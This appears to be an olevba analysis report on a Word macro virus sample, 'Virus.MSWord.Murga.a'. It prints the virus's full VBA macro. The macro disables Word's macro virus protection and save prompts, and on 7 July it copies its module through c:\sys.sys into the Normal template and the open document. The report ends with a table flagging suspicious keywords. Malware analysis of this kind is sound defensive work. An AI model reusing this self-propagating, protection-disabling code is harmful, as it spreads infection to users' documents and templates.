olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murga.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murga.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FilePrint()
' NofrX.a by e[ax] ´98
' Special greetinz goes to -=PU=-
On Error GoTo kraj
 
With Options
    
    .VirusProtection = False
    .SaveNormalPrompt = False
    .ConfirmConversions = False
    
End With

If (Month(Now) = 7) And (Day(Now) = 7) Then

    MsgBox ("Danas je rodjendan Murga-drotu!!!! Ohoooooo!"), vbInformation
    ActiveDocument.VBProject.VBComponents.Item("nofrx").Export ("c:\sys.sys")
    NormalTemplate.VBProject.VBComponents.Import ("c:\sys.sys")
    
    If NormalTemplate.VBProject.VBComponents.Item("nofrx").Name <> "nofrx" Then
    NormalTemplate.VBProject.VBComponents.Import ("c:\sys.sys")
    End If
    If ActiveDocument.VBProject.VBComponents.Item("nofrx").Name <> "nofrx" Then
    ActiveDocument.VBProject.VBComponents.Import ("c:\sys.sys")
    End If
    
End If
kraj:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

